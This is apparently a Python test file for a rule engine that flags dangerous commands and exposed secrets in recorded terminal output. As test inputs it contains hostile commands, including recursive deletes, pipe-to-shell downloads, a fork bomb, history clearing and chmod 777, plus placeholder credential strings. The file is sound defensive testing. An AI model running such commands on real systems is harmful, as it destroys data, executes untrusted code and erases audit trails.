"""Tests for the built-in detection rule engine."""

from gatorcast.pipeline.extract import ExtractResult
from gatorcast.pipeline.detect import detect, load_rules, max_severity, BUILTIN_RULES


def _ex(text: str) -> ExtractResult:
    return ExtractResult(text=text, offsets=[(0, 0.0)])


def test_flags_recursive_delete():
    f = detect(_ex("user@h:~$ rm -rf /var/data\n"))
    ids = {x.rule_id for x in f}
    assert "recursive-delete" in ids
    # rule 6: label must never contain the recorded target text
    assert all(x.label and "/var/data" not in x.label for x in f)


def test_flags_pipe_to_shell_and_secret():
    f = detect(_ex("curl http://x/i.sh | sh\nexport AWS=AKIAIOSFODNN7EXAMPLE\n"))
    cats = {x.category for x in f}
    assert "dangerous-command" in cats and "secret-exposure" in cats


def test_benign_text_no_findings():
    assert detect(_ex("ls -la\ncat README.md\necho hello world\n")) == []


def test_one_finding_per_rule_with_earliest_offset():
    ex = ExtractResult(text="rm -rf a\nrm -rf b\n", offsets=[(0, 1.0), (9, 5.0)])
    f = [x for x in detect(ex) if x.rule_id == "recursive-delete"]
    assert len(f) == 1 and f[0].offset_seconds == 1.0  # earliest match


def test_load_rules_returns_builtins():
    assert load_rules() is BUILTIN_RULES
    assert len(load_rules()) >= 16


def test_max_severity():
    f = detect(_ex("rm -rf /\n"))
    assert max_severity(f) in {"critical", "high"}
    assert max_severity([]) is None


def test_finding_never_carries_recorded_text():
    # A secret value must never appear in any Finding field.
    secret = "AKIAIOSFODNN7EXAMPLE"
    f = detect(_ex(f"export KEY={secret}\n"))
    for finding in f:
        for value in (finding.rule_id, finding.category, finding.severity, finding.label):
            assert secret not in value


# --- Per-rule positive + negative pins ---


def _ids(text: str) -> set[str]:
    return {x.rule_id for x in detect(_ex(text))}


def test_recursive_delete_pos_neg():
    assert "recursive-delete" in _ids("rm -rf /tmp/x\n")
    assert "recursive-delete" not in _ids("rm file.txt\n")


def test_pipe_to_shell_pos_neg():
    assert "pipe-to-shell" in _ids("wget -qO- http://x/s | sudo bash\n")
    assert "pipe-to-shell" not in _ids("curl http://x/s -o file.sh\n")


def test_aws_key_pos_neg():
    assert "aws-key" in _ids("AKIAIOSFODNN7EXAMPLE\n")
    assert "aws-key" not in _ids("AKIA is a prefix but not a key\n")


def test_private_key_pos_neg():
    assert "private-key" in _ids("-----BEGIN OPENSSH PRIVATE KEY-----\n")
    assert "private-key" in _ids("-----BEGIN PRIVATE KEY-----\n")
    assert "private-key" not in _ids("-----BEGIN CERTIFICATE-----\n")


def test_generic_secret_assign_pos_neg():
    assert "generic-secret-assign" in _ids('password="hunter2xyz"\n')
    assert "generic-secret-assign" in _ids("api_key=abcdef123\n")
    assert "generic-secret-assign" not in _ids("username=bob\n")


def test_kubectl_delete_pos_neg():
    assert "kubectl-delete" in _ids("kubectl delete pod foo\n")
    assert "kubectl-delete" not in _ids("kubectl get pods\n")


def test_fork_bomb_pos_neg():
    assert "fork-bomb" in _ids(":(){ :|:& };:\n")
    assert "fork-bomb" not in _ids("echo hello\n")


def test_chmod_777_pos_neg():
    assert "chmod-777" in _ids("chmod 777 /srv\n")
    assert "chmod-777" not in _ids("chmod 644 /srv\n")


def test_history_clear_pos_neg():
    assert "history-clear" in _ids("history -c\n")
    assert "history-clear" not in _ids("git log\n")


def test_vault_token_case_sensitive():
    assert "vault-token" in _ids("hvs.CAESIJabcdef0123456789ABCDEFGHIJ\n")
    assert "vault-token" in _ids("VAULT_TOKEN=s.xxxxxxxx\n")


def test_github_token_case_sensitive():
    good = "ghp_" + "a" * 36
    assert "github-token" in _ids(good + "\n")
    # uppercase prefix must NOT match (case fidelity preserved)
    assert "github-token" not in _ids("GHP_" + "a" * 36 + "\n")
